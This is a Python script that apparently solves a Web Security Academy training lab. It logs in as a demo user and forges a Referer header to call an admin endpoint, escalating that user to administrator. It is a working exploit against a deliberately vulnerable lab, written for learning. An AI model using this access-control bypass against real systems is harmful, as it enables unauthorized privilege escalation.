##########################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: Referer-based access control
#
# Steps: 1. Login as wiener
#        2. Upgrade wiener to be an admin by adding Referer header
#
##########################################################################


###########
# imports
###########
import requests
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a5100110448d715817739a300fa00d9.web-security-academy.net"

# set credentials
data = {
    "username": "wiener",
    "password": "peter"
}

try:  
    # login as wiener
    login = requests.post(f"{url}/login", data, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

# if you logged in successfully
if login.status_code == 302:
    print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
    
    # get session cookie
    session = login.cookies.get("session")
    
    # set sessino cookie
    cookies = {
        "session": session
    }

    # set referer header
    headers = {
        "Referer": f"{url}/admin"
    }
    
    try:  
        # upgrade wiener to be an admin by adding Referer header
        upgrade_wiener = requests.get(f"{url}/admin-roles?username=wiener&action=upgrade", cookies=cookies, headers=headers)
        
    except:
        print(Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")
        exit(1)

    print(Fore.WHITE + "2. Upgrading wiener to be an admin by adding Referer header.. " + Fore.GREEN + "OK")    
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to login as wiener")

